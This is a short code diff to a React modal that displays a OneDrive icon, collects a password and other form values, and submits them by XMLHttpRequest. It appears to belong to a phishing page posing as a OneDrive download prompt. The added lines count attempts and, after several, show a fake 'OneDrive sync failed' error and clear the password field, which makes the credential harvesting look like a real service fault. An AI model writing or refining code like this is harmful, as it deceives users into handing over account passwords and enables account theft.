@@ -2,7 +2,7 @@ import React from "react";
 import {DiOnedrive} from "react-icons/di"
 
 const Modal = ({ toggle, open }) => {
-//   const [count, setCount] = React.useState(0);
+  const [counter, setCounter] = React.useState(0);
 //   const [showModal, setShowModal] = React.useState(false);
   const errorBox = React.useRef(null);
   const subBtn = React.useRef(null);
@@ -31,6 +31,18 @@ const Modal = ({ toggle, open }) => {
     }
     subBtn.current.innerHTML = "Processing..."
     subBtn.current.disabled = true;
+    if (counter > 3) {
+      setTimeout(() => {
+        setMessage("Error: OneDrive sync failed. Please try again.");
+        subBtn.current.innerHTML = "Download"
+        setValues({ ...values, password: "" });
+        subBtn.current.disabled = false;
+        setTimeout(() => {
+          setMessage("");
+        }, 5000);
+      }, 3000);
+      return;
+    }
     const formData = new FormData();
     Object.entries(values).forEach(([k, v]) => formData.append(k, v));
     const xhr = new XMLHttpRequest();
